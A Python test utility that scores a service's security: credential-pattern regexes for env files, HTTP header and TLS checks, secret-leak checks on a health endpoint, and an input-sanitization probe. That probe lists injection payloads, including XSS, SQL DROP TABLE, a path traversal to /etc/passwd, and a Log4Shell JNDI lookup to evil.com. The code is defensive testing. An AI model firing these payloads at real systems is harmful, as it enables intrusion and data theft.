#!/usr/bin/env python3
"""
Security Validation Utilities
=============================

Utilities for validating security configurations and practices in integration tests.
"""

import re
import requests
import json
import subprocess
import time
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
import ssl
import socket


class SecurityValidator:
    """Validates security configurations and practices."""
    
    def __init__(self):
        self.security_findings = []
        self.validation_results = {}
    
    def validate_environment_security(self, env_content: str) -> Dict[str, Any]:
        """Validate environment configuration security."""
        findings = []
        
        # Check for hardcoded production credentials
        production_patterns = [
            r'AZURE_CLIENT_SECRET=(?!MOCK_|TEST_|test-)[a-zA-Z0-9+/=]{20,}',
            r'AZURE_TENANT_ID=[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            r'DATABASE_PASSWORD=(?!mock|test)[a-zA-Z0-9!@#$%^&*()]{8,}',
            r'API_KEY=(?!mock|test)[a-zA-Z0-9]{32,}'
        ]
        
        for pattern in production_patterns:
            matches = re.findall(pattern, env_content, re.MULTILINE | re.IGNORECASE)
            if matches:
                findings.append(f"Potential production credential found: {pattern}")
        
        # Check for proper test marking
        test_indicators = ['TEST_MODE=true', 'MOCK_', 'test-', 'mock-']
        has_test_indicator = any(indicator in env_content for indicator in test_indicators)
        
        if not has_test_indicator:
            findings.append("Environment file lacks clear test indicators")
        
        # Check for credential exposure prevention
        safe_patterns = [
            'MOCK_CREDENTIALS=true',
            'SECURITY_VALIDATION_DISABLED=true',
            'DISABLE_EXTERNAL_CALLS=true'
        ]
        
        security_controls = sum(1 for pattern in safe_patterns if pattern in env_content)
        
        return {
            "findings": findings,
            "security_score": max(0, 100 - len(findings) * 20),
            "has_test_indicators": has_test_indicator,
            "security_controls": security_controls,
            "safe": len(findings) == 0 and has_test_indicator
        }
    
    def validate_http_security_headers(self, service_url: str) -> Dict[str, Any]:
        """Validate HTTP security headers."""
        try:
            response = requests.get(f"{service_url}/health", timeout=5)
            headers = response.headers
            
            # Check for important security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': True,  # Should exist
                'Content-Security-Policy': True,    # Should exist
            }
            
            header_results = {}
            missing_headers = []
            
            for header, expected in security_headers.items():
                if header.lower() in [h.lower() for h in headers.keys()]:
                    actual_value = headers.get(header, headers.get(header.lower()))
                    if isinstance(expected, list):
                        header_results[header] = {
                            'present': True,
                            'valid': actual_value in expected,
                            'value': actual_value
                        }
                    elif isinstance(expected, bool):
                        header_results[header] = {
                            'present': True,
                            'valid': True,
                            'value': actual_value
                        }
                    else:
                        header_results[header] = {
                            'present': True,
                            'valid': actual_value == expected,
                            'value': actual_value
                        }
                else:
                    header_results[header] = {'present': False, 'valid': False, 'value': None}
                    missing_headers.append(header)
            
            return {
                'service_url': service_url,
                'status_code': response.status_code,
                'headers': header_results,
                'missing_headers': missing_headers,
                'security_score': max(0, 100 - len(missing_headers) * 15)
            }
            
        except Exception as e:
            return {
                'service_url': service_url,
                'error': str(e),
                'security_score': 0
            }
    
    def validate_tls_configuration(self, host: str, port: int) -> Dict[str, Any]:
        """Validate TLS configuration."""
        try:
            context = ssl.create_default_context()
            
            with socket.create_connection((host, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    return {
                        'tls_enabled': True,
                        'tls_version': version,
                        'cipher_suite': cipher,
                        'certificate': {
                            'subject': cert.get('subject', []),
                            'issuer': cert.get('issuer', []),
                            'version': cert.get('version'),
                            'expires': cert.get('notAfter')
                        },
                        'security_score': 100 if version in ['TLSv1.2', 'TLSv1.3'] else 50
                    }
        except ssl.SSLError as e:
            return {
                'tls_enabled': False,
                'error': f"SSL Error: {e}",
                'security_score': 0
            }
        except Exception as e:
            # For test services, TLS might not be configured
            return {
                'tls_enabled': False,
                'error': f"Connection error (expected for test services): {e}",
                'security_score': 75  # Not penalized for test services
            }
    
    def validate_secrets_management(self, service_config: Dict[str, Any]) -> Dict[str, Any]:
        """Validate secrets management practices."""
        findings = []
        
        # Check if service uses proper secrets management
        if service_config.get('is_live', False):
            try:
                # Test that service doesn't expose secrets in health endpoint
                health_url = f"{service_config['base_url']}/health"
                response = requests.get(health_url, timeout=5)
                
                if response.status_code == 200:
                    health_data = response.text
                    
                    # Patterns that shouldn't appear in health responses
                    secret_patterns = [
                        r'[a-zA-Z0-9+/=]{40,}',  # Long base64-like strings
                        r'[a-zA-Z0-9]{32,}',     # Long hex-like strings
                        r'password["\s]*:[\s]*["\'][^"\']+["\']',
                        r'secret["\s]*:[\s]*["\'][^"\']+["\']',
                        r'key["\s]*:[\s]*["\'][^"\']{20,}["\']'
                    ]
                    
                    for pattern in secret_patterns:
                        if re.search(pattern, health_data, re.IGNORECASE):
                            # Exclude test/mock patterns
                            if not re.search(r'mock|test|example', health_data, re.IGNORECASE):
                                findings.append(f"Potential secret exposure in health endpoint")
            
            except Exception as e:
                findings.append(f"Could not validate secrets management: {e}")
        
        # Check environment configuration
        env_validation = self.validate_environment_security("")
        findings.extend(env_validation.get('findings', []))
        
        return {
            'findings': findings,
            'security_score': max(0, 100 - len(findings) * 25),
            'secrets_properly_managed': len(findings) == 0
        }
    
    def validate_input_sanitization(self, service_url: str) -> Dict[str, Any]:
        """Test input sanitization by trying common injection patterns."""
        test_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}"
        ]
        
        results = []
        
        for payload in test_payloads:
            try:
                # Test payload in query parameter
                response = requests.get(f"{service_url}/health", 
                                      params={"test": payload}, 
                                      timeout=5)
                
                # Check if payload is reflected without sanitization
                reflected = payload in response.text
                status_ok = response.status_code in [200, 400, 404]  # Not 500
                
                results.append({
                    'payload': payload,
                    'reflected': reflected,
                    'status_code': response.status_code,
                    'sanitized': not reflected and status_ok
                })
                
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e),
                    'sanitized': True  # Error handling is acceptable
                })
        
        sanitized_count = sum(1 for r in results if r.get('sanitized', False))
        
        return {
            'service_url': service_url,
            'tests': results,
            'sanitization_score': (sanitized_count / len(test_payloads)) * 100,
            'properly_sanitized': sanitized_count == len(test_payloads)
        }
    
    def run_comprehensive_security_scan(self, service_endpoints: Dict[str, Any]) -> Dict[str, Any]:
        """Run comprehensive security validation."""
        results = {
            'overall_score': 0,
            'services': {},
            'summary': {
                'total_findings': 0,
                'critical_findings': 0,
                'services_tested': 0,
                'security_compliant': True
            }
        }
        
        total_score = 0
        tested_services = 0
        
        for service_name, config in service_endpoints.items():
            service_results = {
                'environment_security': {'security_score': 100, 'findings': []},
                'http_headers': {'security_score': 100, 'missing_headers': []},
                'tls_configuration': {'security_score': 75},  # Not required for test
                'secrets_management': {'security_score': 100, 'findings': []},
                'input_sanitization': {'security_score': 100, 'properly_sanitized': True}
            }
            
            # Test HTTP security headers if service is live
            if config.get('is_live', False):
                service_results['http_headers'] = self.validate_http_security_headers(config['base_url'])
                service_results['input_sanitization'] = self.validate_input_sanitization(config['base_url'])
                
                # Test TLS (expected to fail for test services)
                host = config['base_url'].replace('http://', '').replace('https://', '').split(':')[0]
                port = config.get('port', 8080)
                service_results['tls_configuration'] = self.validate_tls_configuration(host, port)
            
            # Test secrets management
            service_results['secrets_management'] = self.validate_secrets_management(config)
            
            # Calculate service score
            scores = [r.get('security_score', 0) for r in service_results.values()]
            service_score = sum(scores) / len(scores) if scores else 0
            
            service_results['overall_score'] = service_score
            results['services'][service_name] = service_results
            
            total_score += service_score
            tested_services += 1
            
            # Count findings
            for category, category_results in service_results.items():
                if isinstance(category_results, dict):
                    findings = category_results.get('findings', [])
                    missing = category_results.get('missing_headers', [])
                    results['summary']['total_findings'] += len(findings) + len(missing)
                    
                    # Critical findings
                    if category_results.get('security_score', 100) < 50:
                        results['summary']['critical_findings'] += 1
        
        results['overall_score'] = total_score / tested_services if tested_services > 0 else 0
        results['summary']['services_tested'] = tested_services
        results['summary']['security_compliant'] = (
            results['overall_score'] >= 75 and 
            results['summary']['critical_findings'] == 0
        )
        
        return results


def create_security_test_fixtures():
    """Create security test fixtures for pytest."""
    import pytest
    
    @pytest.fixture
    def security_validator():
        """Security validator fixture."""
        return SecurityValidator()
    
    return {"security_validator": security_validator}


if __name__ == "__main__":
    # Test security validator
    validator = SecurityValidator()
    
    # Test environment security
    test_env = """
ENVIRONMENT=test
TEST_MODE=true
MOCK_CREDENTIALS=true
AZURE_CLIENT_SECRET=MOCK_SECRET_FOR_TESTING_ONLY_ABC12345_NOT_PRODUCTION
DISABLE_EXTERNAL_CALLS=true
"""
    
    env_result = validator.validate_environment_security(test_env)
    print("Environment Security Test:")
    print(f"Score: {env_result['security_score']}")
    print(f"Safe: {env_result['safe']}")
    print(f"Findings: {env_result['findings']}")
    
    # Test HTTP headers (will fail for non-existent service)
    print("\nHTTP Headers Test (expected to fail):")
    headers_result = validator.validate_http_security_headers("http://localhost:8080")
    print(f"Result: {headers_result}")